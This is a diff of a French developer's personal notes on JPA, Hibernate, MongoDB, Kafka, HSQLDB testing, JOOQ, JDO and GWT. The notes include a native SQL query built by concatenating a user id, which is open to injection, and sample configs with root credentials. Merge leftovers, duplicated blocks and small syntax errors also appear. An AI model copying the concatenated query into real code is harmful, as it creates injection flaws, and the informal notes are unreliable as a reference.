+        <persistence-unit name="com.memoclap" transaction-type="RESOURCE_LOCAL(pour des testsunitaires) ou JTA(pour tapper dans LINKjta)"> // du coup applicativement je l'appelle comme ça : LINKentitym
+            <provider>org.eclipse.persistence.jpa.PersistenceProvider</provider> // facultatif provider peut etre eclipselink ou hibernate. si on met rien.. sais pas. depend jars ?
+            <description>EclipseLink EntityManager</description>                 // facultatif
+            <exclude-unlisted-classes>false</exclude-unlisted-classes>
+             <jta-data-source>java:app/MemOclapDataSource</jta-data-source> //LINKjta: mettre la valeur de @DataSourceDefinition(name="java:app/MemOclapDataSource" pour aller cherche un datasource deja defini applicativement
+             ou
+            <properties> // parametres envoyés au persistenceprovider. On peut définir la base de donnée ici mais je prefere LINKjta  
+                <property name="eclipselink.logging.level" value="FINE"/>
+                <property name="javax.persistence.jdbc.driver" value="com.mysql.jdbc.Driver"/>
+                <property name="javax.persistence.jdbc.url" value="jdbc:mysql://127.0.0.1:3306/moviecatalog"/>
+                <property name="javax.persistence.jdbc.user" value="root"/>
+                <property name="javax.persistence.jdbc.password" value="root"/>
+            </properties>
+       </persistence-unit>
+     </persistence>   
+  FORMS ----> envoie des DTO---ne plus les utiliser et passer direct par les entities voir LINKemdlksqj sauf si ils ont pas la meme structure que les Entities
+                           |                               |
+                           vers                            |
+                    CMD     |                              |
+                      update(monDTO)                       |
+                      {                                    |
+                        converti DTO->BO                   |
+                        et appelle EntityManager(avant:DAO)|
+                      }                                    |
+  EntityManager remplaceDAO = methodes crud LINKemdlksqj   |
+      methode(fait appel à ENTITY)------------------(BO=MODEL)ENTITIES connectees à la base
+    //recuperer l'entitymanager applicativement: 
+            @PersistenceContext(name = "com.memoclap") // est def ici LINKentitym
+            EntityManager em;
+        ou
+            EntityManagerFactory emf = Persistence.createEntityManagerFactory("com.memoclap"); //est def ici LINKentitym 
+            et
+            public static EntityManager getEntityManager() {
+            return emf.createEntityManager();
+            }
+    recuperer la connection jdbc depuis un entitymanager :
+        Connection conn = entityManager.unwrap(Session.class).getJDBCConnection();
+     utilisation de entitymanager: JPQL (sql en string) 2.0 contient JPA_API(criterias) preferer criteria api si besoin validation requettes à la compilation et requetes à la synthaxe dynamique
+                JPQL :
+                      - List cat = entityManager.createQuery("SELECT cat FROM nomDeMonObjetJAVA cat LEFT JOIN FETCH cat.nomDeMonFieldJAVA WHERE toto.nomDunFieldJAVA like '%M%' AND cat.unFieldJava=:totocestmoi")
+                                .setParameter("totocestmoi",projectId).setFirstResult(0) ou .getResultList(); //overrite lazy default behaviour at runtime
+                      - List<MonEntite> cat = entityManager.createQuery("SELECT cat FROM category cat LEFT JOIN FETCH cat.art WHERE cat.id=:id",MonEntite.class).getResultList(); //overrite lazy default behaviour at runtime
+                      - String query = "select distinct(alo_project.id), alo_project.nam......from alo_usr alo_usr left join alo_usrcrea alo_usrcrea on alo_usr.usr_id=alo_usrcrea.usrcrea_idusr where alo_usrcrea.usrcrea_idusr is not null and alo_usr.usr_id='"+uid+"' order by alo_project.name";
+                        return em.createNativeQuery(query,Project.class).getResultList(); // pour les selects natifs
+                        em.createNativeQuery(sql).executeUpdate(); // pour les updates natifs
+                JPA_API_CRITERIA : Cest trop de la merde!!!!!!!!!
+                        CriteriaBuilder cb = entityManager.getCriteriaBuilder();
+                        CriteriaQuery<MonEntite> query = cb.createQuery(MonEntite.class);
+                      Root<MonEntite> criteria = query.from(MonEntite.class); //Root c'est le FROM
+                               List<MonEntite> = query.select(criteria); // il renvoit tous les champs
+DAO : design pattern bonne pratique est mort remplacé par entitymanager voir LINKemdlksqj
+un @Repository se base sur les DAO pour faire des find, get etc sur plusieurs tables. Le DAO lui sert aux updates sur une seule table
+  Besoin que MonObjet extends BaseEntity.
+  IMonObjetDao ----------extends-------->IGenericDao (contient toutes les methodes CRUD basiques) public interface IGenericDao<T extends BaseEntity> { public T getBook(long id);}
+    |  extends IGenericDao<Codecast>{       |  
+    |                                       |   
+    |                                       |
+  class MonObjetDao ----------extends-------->class GenericDao (chaque MonObjetDao a son instance) (doit contenir toutes les methodes communes en entier.)
+        ||                              public class GenericDao<T extends BaseEntity> implements IGenericDao<T>{...}
+  public class MonObjetDao extends GenericDao<MonObjet> implements IMonObjetDao {...}   
+  ne contient que les methods specifiques                                        
+generiques : generic : pour eviter de caster et d'avoir a utiliser object  
+  pour ne pas avoir a tapper les requetes basiques les requetes de base select * from toto etc etc...
+        @RepositoryRestResource
+        interface MonObjetRepository extends JpaRepository<MonObjet, Long>{
+        }
+        tout y est!!
+        
+
+kafka : A_COMPLETER voir aussi https://github.com/akka/alpakka-kafka qui fait de reactive streaming c a d backpressure c a d si consummer sont debordes par vitesse ils disent au producer de ralentire. voir aussi du code source sur github/jamesward/koober(demo de la voiture et du gars sur le map) 
+        producer1-   kafka
+                  --\---->topic1(copié sur partition1, partition2, partition3)  // 1 partition leader et les autres partitions sont juste des replicats de securité pour eviter perte données
+        producer2  --\--->topic2                "    partition1(0,1,2,3,4...)          -->consummer1
+                  ------->topic3                "                                      -->consummerGroup(consummer2,consummer3)
+        producer3/------->topic4                "
+        logComppaction sert à convertir automatiquement les doublons-triplons... en un seul: gain de place dans le disque
+        producers ont 3modes d'ecrtutre (async: donees pas garanties reçues. commited to leader: confirmation reception par le partition leader. commited to leader & quorum: confirmation reception par leader + une autre partition)
+mongo :mongodb : nosql : (il vaut mieux stocker les fichiers images documents dans le systeme de fichier que en blob dans la db. la db c'est pour les metadatas.)
+        -toujours activer l'authentification (par user/password au moins) facultatif sur local pour test.
+        -il faut désactiver l'introspection javascript par sécurité(dans fichier de config mettre javascriptEnabled:false). LinkLKJDSFA
+        -attention!!!! l'ordre des champs du json au niveau n-1 est important! au niveau n pas de probleme( par ex utiliser ordre alphabetique)
+        -si je veux utiliser limit alors toujours utiliser sort avant limit dans une requete.
+        -il faut faire un schema: installer https://studio3t.com/knowledge-base-articles/schema-explorer/
+                        resumé de ce que j'ai lu là:https://www.mongodb.com/blog/post/6-rules-of-thumb-for-mongodb-schema-design-part-1
+                        si j'ai relation 1-N(peu nombreux): Où je n'aurais jamais besoin de recuperer ces N tout seuls sans leur parents
+                                    alors je peux faire 
+                                                  {
+                                                    name: 'Kate Monster',
+                                                    ssn: '123-456-7890',
+                                                    addresses: [
+                                                       { street: '123 Sesame St', city: 'Anytown', cc: 'USA' }, // j'en ai peu.
+                                                       { street: '123 Avenue Q', city: 'New York', cc: 'USA' }
+                                                    ]
+                                                  }
+                        si j'ai relation 
+                                1-N(une centaine) et que c'est l'application qui gère la recuperation des N pour l'element 1 . mais en fait ca a l'avantage d'etre aussi une relation N-N
+                                    alors je peux faire (un produit contient plusieurs pieces)
+                                    produit:{
+                                        name: 'MON PRODUIT 1',
+                                        pieces: [     // array of references to Part documents
+                                            ObjectID('AAAA'),    // reference vers la piece ci dessous
+                                            ObjectID('F17C'),    // reference to a different Part
+                                            ObjectID('D2AA'),
+                                            // etc
+                                        ]
+                                        }
+                                    piece:{
+                                            _id: ObjectID('AAAA'),
+                                            partno: '123-aff-456',
+                                            name: '#4 grommet',
+                                            qty: 94,
+                                            cost: 0.94,
+                                            price: 3.99
+                                        }                 
+                            si j'ai une relation 1-N où N c'est PLEIN denregistrements. Produit peut avoir plusieurs pieces mais une piece ne peut avoir qu'un seul produit.
+                                    produit:{
+                                        name: 'MON PRODUIT 1',
+                                        _id: ObjectID('AAAA')
+                                        }
+                                    piece:{
+                                            partno: '123-aff-456',
+                                            name: '#4 grommet',
+                                            qty: 94,
+                                            cost: 0.94,
+                                            price: 3.99
+                                            produit: ObjectID('AAAA') // comme dans une base relationelle 1-N
+                                        }                               
+        -il faut desactiver la casesensitive et accent sensitive pour les requetes
+        -l'ordre dans les requetes est important: d'abord filtrer puis trier puis joindre
+        -il faut enable journaling pour recuperer la base old version si devient inconsistent (configuration-> storage.journal.enabled)
+        -requetes ordonnees sortees toujours sur un ou des champs indexés. (sinon sur un-des champs non indexes risques d'overflow donc d'erreur: retourne rien)
+        -des arrays pas trop longues et indexees(ca l'est pas défaut)
+        pour tester online en ligne des requetes: https://docs.mongodb.com/manual/tutorial/query-arrays/ 
+        pour installer mongodb en local: 
+            https://docs.mongodb.com/manual/tutorial/install-mongodb-on-windows/
+            dezipper quelque part, mkdir c:/data/db(ou autre part...)
+        pour démarrer mongodb serveur en local: 
+            puis cmd ceci: 
+            pathVersLeBin/mongod.exe --dbpath="c:\mongodb-win32-x86_64-2008plus-ssl-4.0.9\data\db" // ca demare le serveur par defaut là: mongodb://127.0.0.1:27017/?gssapiServiceName=mongodb
+        pour demarrer un client mongodb pour administrer la base et pour faire des requetes de test
+            ensuite executer mongo.exe: c'est un client pour faire les requetes (c'est du javascript la dedans) LinkLKJDSFA . On peut aussi utiliser un gui qui s'appelle Robo3T à installer.
+            ou bien mongo mongodb://mongodb0.example.com:28015/testdb?ssl=true // si il est distant
+        exemples de requetes. Une collection = une table relationelle
+            var doc = db.uneCollection.findOne({ _id: 1 })// trouver par id (du coup doc est une variable) 
+            db.uneCollection.remove({ _id: 1 })  
+            db.uneCollection.insert({ _id: 1, jsFunc: function(){ print("hello") } } ) // si uneCollection n'existe pas elle est automatiquement créee
+            db.myNewCollection3.createIndex( { y: 1 } ) // ajoute un indexe dans la collection
+
+                          
+  DM 
+   ^ 
+   | IOC (interfaces)
+   V
+Hibernate : implemente jpa
+Hibernet le livre:
+exemple de fichier mapping pojo-base p10
+si erreur:
+        (don't flush the Session after an exception occurs) 
+            c'est parce qu'il y aune exception dans une transation et que cette exception n'est pas trowée et que du coup derriere je refais une autre requete dans cette transaction. IL faut gérer la transaction. avec LINKtranslsdfjai 
+si j'ai cette erreur:        Cannot convert value '0000-00-00 00:00:00' from column 5 to TIMESTAMP
+        il faut que je modif mes valeurs ='0000-00-00 00:00:00' en date valide 
+  definition bean: getter, setter independant (pas d'extension ni d'heritage) serializable
+  definition pojo: idemn que bean mais peut etendre, heriter, peut ne pas être serializable
+  DAO faire un store par dm p7 gestion des sessions à ce niveau grâce au Contextual Session
+      possibilite synchro schema base-DAO java
+      annotations hibernate:p5-6
+          Feaching
+          caching (parametrer taille et temps d'expiration)
+          lazy-loading
+              for (Category categ: categories)
+              {
+                for (Art art: categ.getArt()){system.out.print(art.getTitle());}} // FAIT N requettes! (erreur N+1)
+              Pour eviter faire:
+               1) List cat = entityManager.createQuery("SELECT cat FROM category cat LEFT JOIN FETCH cat.art WHERE cat.id=:id").getResultList(); //overrite lazy default behaviour at runtime
+               2) @ManyToMany
+                  @BatchSize(size=10) recup que les 10 premps ou bien @Fetch(FetchMode.JOIN)// recup tout! inverse de lazy
+                  public Set<Art> getArt(){return arts;}
+              Si LazyInitializationException: c parce qu'il n'existe pas d'EntityManager                
+      exceptions generiques hibernates vers spring p7
+            pour faire des requetes:
+            HQL   possede criteria api comme JPQL
+            ActiveRecordPattern (pour pouvoir faire monEntite.save())
+      Hibernate peut fonctionner avec framework Lucene qui permet de faire des recherches textuelles imprecises comme google
+      Si classes java hierarchisees, meilleur option c'est faire ca: 
+            Java                                                                                    DB
+          @Entity                                                                                     1 seule table
+          @Id                                                                                         c'est le champ de cle primaire
+          @GeneratedValue                                                                             id est incremente auto
+          @Inheritance(strategy = Inheritance type.SINGLE_TABLE)                                         cols de A
+          @DiscriminatorColumn(discriminatorType=DiscriminatorType.STRING ou CHAR ou INTEGER)            cols de B et de C
+          @DiscriminatorValue("GENERIC")
+                A                                                                                   
+               /  \                         
+              /      @DiscriminatorValue("CHAISPASCEQUECEST!")
+      B extends A     C extends A                        
+       @Entity
+       @Cache(usage=CacheConcurrencyStrategy.READ_WRITE//existe quasi pas de cache: access concurent bien tolere .NONSTRICT_READ_WRITE si updates rares(bof, pas bien pige) .READ_ONLY(cache jamais invalide: tres performant mais updates pas possibles si cache est outOfdate (sur?))
+       @Table(name="NonDeLaTableEnBDSIDifferenteQueNomClasseJava") // optionnel
+            public class UserPermission implements DomainObject, Serializable 
+            {
+            	@Id //Cle primaire
+            	@GeneratedValue //(strategy=GenerationType.AUTO par defaut c a d 1 sequence pot tables. Deconseille) ou (strategy=GenerationType.SEQUENCE, generator="NOMDEMASEQ") 1 sequence nommee NOMDEMASEQ pour cette table seulement
+            	private Integer id;
+
+              @ManyToOne //1ici a n labas(passur?)
+              @Column(name="NonDeLaColonneEnBDSIDifferenteQueNomProprieteJava") // optionnel
+              @Column(name="price", columnDefinition="Decimal(10,2) default '0.0'") // si on veut une valeur par defaut DANS LA BASE de donnée seulement; renvoit qd meme null en java si ce champ est déjà null dans la base
+              @Cache peut etre aussi mis au niveau d'une propriete
+              @NotNull // si je veux valider que le champ ne soit pas null
+               @Pattern(regexp = "^\\(?(\\d{3})\\)?[- ]?(\\d{3})[- ]?(\\d{4})$",message = "{invalid.phonenumber}") // si je veux valider que le champ respecte un pattern regexp
+            	   private Idea idea;
+            	@OneToMany (orphanRemoval=true//pour les deletes en cascade, cascade={javax.persistence.CascadeType.ALL}//pour les update en cascades)
+            	               ,mappedBy="permission") // car je suis dans le classe Permission.class et je fais ref à UserPermission.permission
+            	   private Set<User> getUsers(){return users;}
+            	@Temporal(TemporalType.TIMESTAMP)
+            	   public Date getCommentDate(){return commentDate;}
+            	@Version //pour les acces concurents   (voir cache ci-dessus)
+            	   public Integer getVersion(){return version;}
+              @Transient // en opposition à @Basic qui est mis par defaut
+                  public String proprieteNonPersistanteCarOnAMisTransient;                            
+                  ManyToMany: 2 possibilites:
+                        permission.class:
+                          @ManyToMany (mappedBy="nomDeLaProprieteDeLautreEntiteQuiAppelleCetteClasseLà") //mappedBy optionel
+                        	@JoinTable(name="UserPermission")  // ma table de jointure. pas besoin de creer la table de cette classe.
+                        	private Set<User> users;
+                        user.class:
+                            @ManyToMany
+                    	      @JoinTable(name="UserPermission")
+                    	      private Set<Permission> permissions;
+                  ManyToMany jointure de trois tables: 
+                            ma table de jointure: 
+                              @Entity
+                            public class UserPermission implements DomainObject, Serializable 
+                            {
+                            	@Id
+                            	private Integer id;
+                            	@ManyToOne 
+                            	private Idea idea;
+            	@ManyToOne
+            	private User user;
+            	@ManyToOne
+            	private Permission permission;
+            	@Override
+            	public String getId() {
+            		return null;
+            	}
+                            } 
+                          	@Override
+                          	public String getId() {
+                          		return null;
+                          	}
+                          }    	      
+      chacune de mes tables jointes: 
+        	@OneToMany(mappedBy="permission") // car je suis dans le classe Permission.class et je fais ref à UserPermission.permission
+        	private Set<UserPermission> userPermission;
+             Comparer des entitees entre elles si elles sont des listes comme proprietes: il faut overrider equals et hashcode: (voir page 84Spring persistance with Hibernate)
+                @Override    (A FAIRE: GENERALISER AVEC LE DESIGN PATTERN DES DAO: dao sont morts remplacés par entitymanager voir LINKemdlksqj)
+                public boolean equals(Object o)
+                {
+                  if(this==o) return true;
+                  if(!(o instanceof Category)) return false;
+                  Category category = (Category));
+                  if (categoryName!=null? !categoryName.equals(category.categoryName): category.categoryName!=null)
+                  {return false;
+                  }else{return true;}
+                }
+                @Override
+                public int hashCode()
+                {return categoryName!=null? categoryName.hashcode():0;}
+        utile pour transactions
+            mettre @Transactional devant classe ou methode // rend ma methode dans une transaction LINKtranslsdfjai
+            @Transactional(rollbackFor = Exception.class, noRollbackFor = AuthWebBusinessWSException.class) // si je throw  une exception dans mon programme ca fait un rollback si c'est une autre exception de type Authmachin ca ne fait pas de rollback 
+            AF pourquoi mettre transactional pour readonly requettes?
+            si j'ai javax.persistence.TransactionRequiredException: null mettre @Transactional plus en amont ou plus en aval du stacktrace. Il n'est pas sur la bonne méthode.
+    si j'ai l'erreur Internal Exception: java.sql.SQLIntegrityConstraintViolationException: integrity constraint violation: NOT NULL check constraint; SYS_CT_10110 table: ALO_USR column: USR_NAME
+            il me disait que l'erreur etait dans une methode select mais qui n'avait rien a voir avec la table ci dessus. En fait l'erreur a eu lieu juste avant! Connerie de merde. bref. effectivement le champ etait null dans la requette precedente alors qu'il ne devait pas. un peu merdique ce truc. Il aurait pu m'indiquer le bon stack ce con.
+    
+hsqldb : LINKldkjgieieioruz
+        base de donnée pour les tests
+        si erreur data exception: string data, right truncation c'est parce que j'ai voulu inserer une colonne trop longue
+    <bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource">
+		<property name="driverClassName" value="org.hsqldb.jdbcDriver" />
+		<property name="url" value="jdbc:hsqldb:mem:v3" /> // bien mettre mem sinon il fait chier avec les connexions mais c'est que pour tester car volatile
+		<property name="username" value="sa" />
+		<property name="password" value="" />
+	</bean>                
+    maven:
+        <dependency>
+            <groupId>org.hsqldb</groupId>
+            <artifactId>hsqldb</artifactId>
+            <version>2.3.4</version>
+        </dependency>
+        classe de test:
+            @BeforeAll
+    public static void initDB() throws ClassNotFoundException, SQLException
+	 Class.forName("org.hsqldb.jdbc.JDBCDriver");
+           try (Connection connection = getConnection(); Statement statement = connection.createStatement();) {
+            statement.execute("CREATE TABLE employee (id INT NOT NULL, name VARCHAR(50) NOT NULL,email VARCHAR(50) NOT NULL, PRIMARY KEY (id))");
+            connection.commit();
+            statement.executeUpdate(
+                    "INSERT INTO employee VALUES (1001,'Vinod Kumar Kashyap', 'vinod@javacodegeeks.com')");
+            statement.executeUpdate("INSERT INTO employee VALUES (1002,'Dhwani Kashyap', 'dhwani@javacodegeeks.com')");
+            statement.executeUpdate("INSERT INTO employee VALUES (1003,'Asmi Kashyap', 'asmi@javacodegeeks.com')");
+            connection.commit();
+        }
+    }
+            @AfterAll
+            public static void destroy() throws SQLException, ClassNotFoundException, IOException
+            {
+                try (Connection connection = getConnection(); Statement statement = connection.createStatement();) {
+                    statement.executeUpdate("DROP TABLE employee");
+                    connection.commit();
+                }
+            }
+            private static Connection getConnection() throws SQLException {
+                return DriverManager.getConnection("jdbc:hsqldb:mem:employees", "vinod", "vinod");// bien mettre mem sinon il fait chier avec les connexions mais c'est que pour tester car volatile
+            }
+            @Test
+            public void getTotalRecordsTest() {
+                int ret=0;
+                try (Connection connection = getConnection(); Statement statement = connection.createStatement();) {
+                    ResultSet result = statement.executeQuery("SELECT count(*) as total FROM employee");
+                    if (result.next()) {
+                        ret= result.getInt("total");
+                    }
+                } catch (SQLException e) {
+                    e.printStackTrace();
+                }
+                Assertions.assertEquals(3, ret);
+            }
+=======
 GWT :
 pour lancer en dev sur jetty gwt mais ca ne marche pas  sur mon pom
       %M3%/mvn gwt:run -Denv=dev -DrunTarget=WecApp.html
@@ -7655,14 +7758,115 @@ faire un formulaire de upload telechargement de fichier, d'image:
                             });
                             splitPanel.add(formulaire);
                         
-Faire appel a un rpc :
-    Class bidule
-    {
-    private LogginServiceAsync logginService;
-    public bidule() //constructeur
-    {
-    logginService = GWT.create(LogginService.class);
-    }
+Pour faire quoi?:
+            @AfterAll
+            public static void destroy() throws SQLException, ClassNotFoundException, IOException
+            {
+                try (Connection connection = getConnection(); Statement statement = connection.createStatement();) {
+                    statement.executeUpdate("DROP TABLE employee");
+                    connection.commit();
+                }
+            }
+            private static Connection getConnection() throws SQLException {
+                return DriverManager.getConnection("jdbc:hsqldb:mem:employees", "vinod", "vinod");// bien mettre mem sinon il fait chier avec les connexions mais c'est que pour tester car volatile
+            }
+            @Test
+            public void getTotalRecordsTest() {
+                int ret=0;
+                try (Connection connection = getConnection(); Statement statement = connection.createStatement();) {
+                    ResultSet result = statement.executeQuery("SELECT count(*) as total FROM employee");
+                    if (result.next()) {
+                        ret= result.getInt("total");
+                    }
+                } catch (SQLException e) {
+                    e.printStackTrace();
+                }
+                Assertions.assertEquals(3, ret);
+            }
+JOOQ : mieus que jdo?
+    facile: dans eclipse pour lancer le generateur: 
+    class main: org.jooq.util.GenerationTool
+    arguments de programme: /jooq.properties
+    ce fichier contient: 
+    jooq.properties:
+           #Configure the database connection here
+          jdbc.Driver=com.mysql.jdbc.Driver
+          jdbc.URL=jdbc:mysql://localhost:3306/lduverge
+          jdbc.Schema=lduverge
+          jdbc.User=root
+          jdbc.Password=
+          
+          #The default code generator. You can override this one, to generate your own code style
+          #Defaults to org.jooq.util.DefaultGenerator
+          generator=org.jooq.util.DefaultGenerator
+          
+          #The database type. The format here is:
+          #generator.database=org.util.[database].[database]Database
+          generator.database=org.jooq.util.mysql.MySQLDatabase
+          
+          #All elements that are generated from your schema (several Java regular expressions, separated by comma)
+          generator.database.includes=.*
+          
+          #All elements that are excluded from your schema (several Java regular expressions, separated by comma). Excludes match before includes
+          generator.database.excludes=
+          
+          #Primary key / foreign key relations should be generated and used. 
+          #This will be a prerequisite for various advanced features
+          #Defaults to false
+          generator.generate.relations=true
+          
+          #Generate deprecated code for backwards compatibility 
+          #Defaults to true
+          generator.generate.deprecated=false
+          
+          #The destination package of your generated classes (within the destination directory)
+          generator.target.package=com.application.yoani.server.servlet.jooq
+          
+          #The destination directory of your generated classes
+          generator.target.directory=D:/workspaceGanymedeGXT/YoaniWeb/src/
+          
+          #Generate a master data table enum classes (several Java regular expressions, separated by comma)
+          #generator.generate.master-data-tables=[a list of tables]
+          
+          #For every master data table, specify two special columns
+          #generator.generate.master-data-table-literal.[master data table]=[column used for enum literals]
+          #generator.generate.master-data-table-description.[master data table]=[column used for documentation]
+
+JDO :
+si j'ai l'erreur 
+    error: cannot access Detacheable.... retapper code pour qu'il recompile ca devrait marcher.
+pour faire un java2db java vers la base de donnee: 
+    soit utiliser maven mais ca ne marche pas tout le temps (???) Attention bien utiliser mvn datanucleus:schema-createschema  et non pas mvn datanucleus:schema-create!!
+    ATTEntion si rien n'est cree en base on peut executer datanucleus:schema-validate et là .. ca marche... pfff 
+    Soit utiliser le pluggin eclipse DataNucleus de eclipse
+faire une relation N-N jointure nn
+        SUPPLIERS------PRODUCTS_SUPPLIERS---------PRODUCT
+        supplier_id     product_id                product_id
+                        supplier_id
+                        
+      // ATTENTION si il enregistre qu'une seule ligne à chaque fois dans la table des jointures essayer d'inverser les annotations entre les deux classes
+        public class Product // important: mettre les getters et setters et les utiliser sinon le passage detached-clean->detached-dirty ne se fait pas si on modif un champ
+        {
+            @Persistent(table="PRODUCTS_SUPPLIERS")
+            @Join(column="PRODUCT_ID")
+            @Element(column="SUPPLIER_ID")
+            Set<Supplier> suppliers; Attention plutot utiliser ArrayList à Set car ArrayList est serialisable!
+        }
+        public class Supplier
+        {
+            @Persistent(mappedBy="suppliers") // nom de l'objet java
+            Set<Products> products;  Attention plutot utiliser ArrayList à Set car ArrayList est est serialisable!
+        }
+Faire une relation 1-N
+ELEVE---------------GROUPE (un eleve appartient à un groupe et un groupe appartient à plusieurs eleves)
+ideleve             idgroupe
+idgroupe
+public class Groupe
+{
+    Set<Eleve> eleves;  Attention plutot utiliser ArrayList à Set car ArrayList est est serialisable!
+}
+
+=======
     (...)
      logginService.getStudentById(st, new AsyncCallback<VPA01_STUDENT>()
 				{
@@ -8143,1301 +8347,6 @@ pour Yahoo :+ gwt :
 Pour faire un drag and drop: 
       l'avatar javascript de chaque widget est l'objet element: widget.getElement().(peut être utilise dans le code JavaScript )
 
-GWT :pour faire un nouveau projet GWT:VIEUX OLD
-How to create a WAR file from a GWT project with Eclipse: OLD VIEUX
-        First Time Only: 
-        Open folder {PF}\www\com.domain.{Project} 
-        Create new folder WEB-INF 
-        Open new folder {Project}\www\com.domain.{Project}\WEB-INF 
-        Create new folder lib 
-        Create new file web.xml (see sample) 
-        Open new folder {Project}\www\com.domain.{Project}\WEB-INF\lib 
-        Copy file gwt-servlet.jar into this new lib folder 
-        Every Time: 
-        Run compile script {PF}\{Project}-compile 
-        Select your project's src folder in Eclipse 
-        Choose to Export... 
-        Export to JAR file 
-        Check Export generated class files and resources 
-        Check Export java source files and resources 
-        Set the export destination as {PF}\www\com.domain.{Project}\WEB-INF\lib\{Project}.jar 
-        Check Compress the contents of the JAR file 
-        Click Next twice 
-        Select Generate the manifest file 
-        You don't have to check Save the manifest in the workspace 
-        Don't Seal the contents (Seal some packages ... Nothing sealed 
-        Leave the Main class blank 
-        Click Finish 
-        Open folder {PF}\www\com.domain.{Project} 
-        Select all files and folders 
-        Add contents to a zip file named {Project}.war 
-        Definitions: 
-        {GWT} = Path to the GWT folder containing build scripts (i.e. gwt-windows-1.1.10) 
-        {PF} = Path where your project will exist (i.e. C:\Dev\MyProject) 
-        {Project} = Project name (should differ from {PF} folder name)
-si on a une erreur gwt de type:
-      [ERROR] Unable to instantiate 'com.printflux.server.MyTreeServiceImpl'
-      java.lang.ClassNotFoundException: com.printflux.server.MyTreeServiceImpl
-                  at com.google.gwt.dev.shell.GWTShellServlet.tryGetOrLoadServlet(GWTShellServlet.java:874)
-                  at com.google.gwt.dev.shell.GWTShellServlet.service(GWTShellServlet.java:240)
-                  at javax.servlet.http.HttpServlet.service(HttpServlet.java:802)
-      c'est parce qu'il lui manque des classes sous le repertoire "bin"
-
-        definir sytem path: %PEAR%;C:\Program Files\maven-2.0.7\bin\;%JAVA_HOME%;C:\gwt-windows-1.4.61\(attention a la version)
-        mkdir DynaTable
-        cd DynaTable
-        projectCreator -eclipse DynaTable
-        (si ca ne marche pas cause version java: rajouter en tete de ce fichier: Set Path=C:\gwt-windows-1.4.61\;C:\Program files/JavaSoft/JRE/1.5.0_08/bin)
-        applicationCreator -eclipse DynaTable com.google.gwt.sample.dynatable.client.DynaTable
-        ou
-        applicationCreator -eclipse projetGWT com.pgwt.moduleone.client.ModuleOne
-        (si ca ne marche pas cause version java: rajouter en tete de ce fichier: Set Path=C:\gwt-windows-1.4.60\;C:\Program files/JavaSoft/JRE/1.5.0_08/bin)
-        Pour prendre un ancien projet non eclipse et en faire un eclipse(pour notemment le debugger debuger): faire un nouveau projet en fait vierge et faire un beyond compare
-        Merde le cache: faire un refresh et il recompile tout: java html et css
-        Pour supprimer le cache supprimer les fichiers sous .gwtache/bytecode
-        Supprimer ce qui ya comme classes sous bin mais normalement pas necessaire: faire un refresh
-        le fichier css est pris en compte si il est sous: projetGWT\src\com\pgwt\moduleone\public\ModuleOne.css
-      Clientbundle: meilleure methode pour definir le css comme ca je peux dev avec superdevmode: 
-      classe de resources:
-                  package com.application.yoani.client.resources;
-                                  public interface YoaniResources extends ClientBundle {
-                                  	  public static final YoaniResources INSTANCE =  GWT.create(YoaniResources.class);
-                                  	  
-                                  	  
-                                  	  @ClientBundle.Source("com/kanail/client/SamiCours.css")
-                                  	  @CssResource.NotStrict // mettre ca pour ne pas avoir de pb de type besoin de mettre @external obfuscated
-                                  	  public Css cssGrowingSchoolbag();
-                                  
-                                  	  @NotStrict
-                                  	  @Source("com/application/yoani/client/resources/gxt-all.css")
-                                  	  public Css cssGWT();
-// ensuite dans mon module entrypoint je mettrais: 
-                                        public void onModuleLoad() 
-	                                    {
-                                                  Resources.INSTANCE.css().ensureInjected();
-                                                  ......
-                                                  Mais si je veux pouvoir virer un css apres n'importe ou  faire ca: 
-                                                  // Equivalent to MyClass.INSTANCE.ensureInjected()
-                                                  StyleElement e  = StyleInjector.injectStylesheet(MyClass.INSTANCE.css().getText());
-                                                  // Remove the injected css element
-                                                  e.removeFromParent();
-                                                  
-
-                                  	  /*
-                                  pour les datas: ?
-                                  	  @Source("test.txt")
-                                  	  public DataResource test();
-                                  	  
-                                  pour des fichiers de type autre: 
-                                  	  @Source("manual.pdf")
-                                  	  public DataResource ownersManual();
-                                  	  
-                                  	  
-                                  pour les fichiers textes (pas bien compris... sinon voir plus bas):
-                                  		@Source("synchronous.txt") ou xml
-                                  			  TextResource synchronous();
-                                  			  VALABLE POUR TOUTES LES RESSOURCES!!  C genial:est compatible avec i18n: voici l'ordre de recherche si on est en francais
-                                  	    1.  synchronous_fr_FR.txt
-                                     		2. synchronous_fr.txt
-                                     		3. synchronous.txt
-                                  		//ailleurs:
-                                  		//		 Using a TextResource
-                                  				myTextArea.setInnerText(Resources.INSTANCE.synchronous().getText());
-                                  		
-                                  			  @Source("b.txt")
-                                  			  ExternalTextResource asynchronous();
-                                  			}
-                                  		//ailleurs: Using an ExternalTextResource
-                                  		Resources.INSTANCE.asynchronous().getText(new ResourceCallback<TextResource>() {
-                                  		  public void onError(ResourceException e) { ... }
-                                  		  public void onSuccess(TextResource r) {
-                                  		    myTextArea.setInnerText(r.getText());
-                                  		  }
-                                  		});
-                                  pour les fichiers textes i18n:
-                                        creer une interface: (une interface peut avoir des methodes statiques donc pas obligé de faire des classes abstraites ?) 
-                                                  public interface Labels extends com.google.gwt.i18n.client.Messages
-                                                  {
-                                                  	String connexion();
-                                                  	String enterYourUserNameAndPassword();
-                                                  }
-                                          dans une autre classe: 
-                                                Labels constants = (Labels)GWT.create(Labels.class);
-                                                loginForm.setHeading(constants.connexion());
-                                          et sous le repertoire client j'ai  
-                                            	    1. Labels_fr_FR.txt
-                                               		2. Labels_fr.txt
-                                               		3. Labels.txt
-                                    
-                            
-                            pour les images:
-                            dans 
-                            public interface YoaniResources extends ClientBundle {
-	                               public static final YoaniResources INSTANCE =  GWT.create(YoaniResources.class);
-                            		@Source("logo.png")                               (cette image est stockee sous monapp/client/resources)
-                            		 @ImageOptions(flipRtl = true) // flip horizontally
-                            		 @ImageOptions(flipRtl = repeatStyle) // repeter image
-                                 @ImageOptions(width = 10) // taille de l'image (size)// attention non je pense que ca ne marche pas 
-                            		  ImageResource logo();
-                            		  ailleurs: 
-                            		  Resources resources = GWT.create(Resources.class);
-                            		Image img = new Image(resources.logo());
-                            		ou si j'ai un bouton bt:
-                                bt.setIcon(AbstractImagePrototype.create(resources.logo()));
-                                  a savoir: 
-                                      *  ImageBundle becomes ClientBundle
-                                      * AbstractImageProtoype becomes ImageResource
-                                      * AbstractImagePrototype.createImage() becomes new Image(imageResource)
-                                      * Other methods on AbstractImagePrototype can continue to be used by calling AbstractImagePrototype.create(imageResource) to provide an API wrapper.
-                            
